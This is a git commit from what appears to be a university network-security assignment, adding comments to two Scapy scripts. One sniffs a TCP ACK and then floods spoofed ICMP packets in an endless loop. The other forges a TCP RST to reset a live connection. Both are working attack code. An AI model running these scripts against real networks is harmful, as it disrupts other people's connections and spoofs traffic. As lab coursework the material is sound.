ac30152f33d55ff5db3d2f3c687865c181d6f9d3
Nuno Venturinha <nuno.venturinha.f@tecnico.ulisboa.pt>
2017-10-23 22:26:48 +0100

    Added comments

--- assignments/assignment3/icmp_flood.py
+++ assignments/assignment3/icmp_flood.py
@@ -1,17 +1,27 @@
 #! /usr/bin/env python
 from scapy.all import *
 
+# Identify the packet with the "ACK" flag
 def stopfilter(x):
 	if x[TCP].flags == 16:
 		return True
 	else:
 		return False
 
+# Sniff packets until we find the one with the "ACK" flag
 packets = sniff(filter='tcp', stop_filter=stopfilter)
+
+# Get the last packet we sniffed
 packet = packets[-1]
 
+# Get the source and destinations
 src = packet[IP].src
 dst = packet[IP].dst
 
+# Bamboozle
 while True:
 	ans,unans = sr(IP(src=src, dst=dst)/ICMP())
+
+
+
+
--- assignments/assignment3/rst_hijack.py
+++ assignments/assignment3/rst_hijack.py
@@ -1,15 +1,21 @@
 #! /usr/bin/env python
 from scapy.all import *
 
+# Identify the packet with the "ACK" flag
 def stopfilter(x):
 	if x[TCP].flags == 16:
 		return True
 	else:
 		return False
 
+# Sniff packets until we find the one with the "ACK" flag
 packets = sniff(filter='tcp', stop_filter=stopfilter)
+
+# Get the last packet we sniffed
 packet = packets[-1]
 
+# Get the relevant parameters from the packet and switch the
+# source and destination
 src = packet[IP].dst
 dst = packet[IP].src
 sport = packet[TCP].dport
@@ -17,6 +23,12 @@ dport = packet[TCP].sport
 flags = "R"
 seq = packet[TCP].ack
 
+# Create the reset hijacking packet
 hijack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags=flags, seq=seq)
-hijack.show()
+
+# Bamboozle
 send(hijack)
+
+
+
+
